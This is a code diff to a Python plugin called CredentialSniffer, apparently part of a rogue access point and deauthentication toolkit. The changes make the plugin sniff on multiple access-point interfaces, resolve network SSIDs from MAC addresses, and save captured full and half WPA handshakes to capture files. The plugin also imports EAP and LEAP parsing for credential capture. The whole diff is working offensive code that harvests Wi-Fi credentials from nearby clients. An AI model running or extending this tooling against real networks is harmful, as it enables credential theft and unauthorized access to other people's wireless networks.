@@ -6,10 +6,12 @@ It can be used after a deauthentication attack
 While sniffing or even while running a fake access point
 """
 import os
+from pyric import pyw as pyw
 from plugin import AirScannerPlugin, AirHostPlugin, AirDeauthorPlugin
 from AuxiliaryModules.packet import Beacon
 from scapy.all import Ether, Dot11Beacon, EAPOL, EAP, LEAP, PcapWriter, sniff, load_contrib
 from utils.networkmanager import NetworkCard
+from utils.utils import NetUtils
 from threading import Thread
 from time import sleep
 try:  # Python Scapy-Com check (inspiration from EAPEAK/McIntyre)
@@ -54,8 +56,10 @@ class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirDeauthorPlugin):
 	# This will be called when starting the access point
 	def start(self):
 		self.is_ap = True
-		self.sniffer_thread = Thread(target=self.start_credential_sniffing)
-		self.sniffer_thread.start()
+		ap_interfaces = [ iface for iface in pyw.winterfaces() if self.running_interface.strip() in iface]
+		for iface in ap_interfaces:
+			self.sniffer_thread = Thread(target=self.start_credential_sniffing, args=(iface,))
+			self.sniffer_thread.start()
 
 	# This will be called before a deauthentication attack
 	# The channel needs to be fixed so it does not miss any packets
@@ -69,19 +73,21 @@ class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirDeauthorPlugin):
 																				self.running_interface, 
 																				self.fixed_channel,
 																				self.timeout)
-		self.sniffer_thread = Thread(target=self.start_credential_sniffing)
+		self.sniffer_thread = Thread(target=self.start_credential_sniffing, args=(self.running_interface,))
 		stop_timer_thread = Thread(target= self.timed_stop, args=(self.timeout,))
 		self.sniffer_thread.start()
 		stop_timer_thread.start()
 
-	def start_credential_sniffing(self):
+	def start_credential_sniffing(self, interface):
+		# TODO map packets to interface with threads
 		try:
-			sniff(	store		=	0,
+			sniff(	iface		=	interface,
+					store		=	0,
 					prn			=	self.extract_credential_info,
 					stop_filter	=	self._stop)
 		except Exception as e: 
-			print "Error Occurred while sniffing"
-			print e
+			#print "Error Occurred while sniffing"
+			#print e
 			pass
 
 	def restore(self):
@@ -185,6 +191,10 @@ class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirDeauthorPlugin):
 			dot11_header = packet["Dot11"]
 			return dot11_header.addr1
 
+	def _get_ssid_from_mac(self, mac_address):
+		for iface in pyw.winterfaces():
+			if pyw.macget(pyw.getcard(iface)) == mac_address:
+				return NetUtils().get_ssid_from_interface(iface)
 
 	def _prepare_wpa_handshake_log(self, client_mac):
 		fields = {
@@ -209,15 +219,17 @@ class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirDeauthorPlugin):
 
 
 	def _log_half_wpa_handshake(self, client_mac):
-		self.wpa_handshakes[client_mac]['ssid'] = self.ssid
 		if (self.wpa_handshakes[client_mac]['frame1'] and 
 			self.wpa_handshakes[client_mac]['frame2'] and
 			not self.wpa_handshakes[client_mac]['logged']):
 
-			print "[+] Half WPA Handshake found for client '{}' and network '{}'\n".format(	client_mac,
-																						self.ssid)
+			ssid = self._get_ssid_from_mac(self._get_source_from_packet(self.wpa_handshakes[client_mac]['packets'][0]))
+			self.wpa_handshakes[client_mac]['ssid'] = ssid
 
-			log_file_path = "data/wpa_half_handshakes/handshake_{}_{}.cap".format(	self.ssid,
+			print "[+] Half WPA Handshake found for client '{}' and network '{}'\n".format(	client_mac,
+																							ssid)
+
+			log_file_path = "data/wpa_half_handshakes/handshake_{}_{}.cap".format(	ssid,
 																					client_mac)
 			self._log_packets(log_file_path, client_mac)
 
@@ -246,11 +258,11 @@ class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirDeauthorPlugin):
 			self.wpa_handshakes[client_mac]['beacon'] and
 			not self.wpa_handshakes[client_mac]['logged']):
 
-			print "[+] WPA Handshake found for client '{}' and network '{}'\n".format(	client_mac,
-																					self.wpa_handshakes[client_mac]['ssid'])
+			print "[+] WPA Handshake found for client '{}' and network '{}'\n".format(client_mac,
+																					  self.wpa_handshakes[client_mac]['ssid'])
 
-			log_file_path = "data/wpa_handshakes/handshake_{}_{}.cap".format(	self.wpa_handshakes[client_mac]['ssid'],
-																				client_mac)
+			log_file_path = "data/wpa_handshakes/handshake_{}_{}.cap".format(self.wpa_handshakes[client_mac]['ssid'],
+																			 client_mac)
 			self._log_packets(log_file_path, client_mac)
 
 	def _log_packets(self, file_path, client_mac):
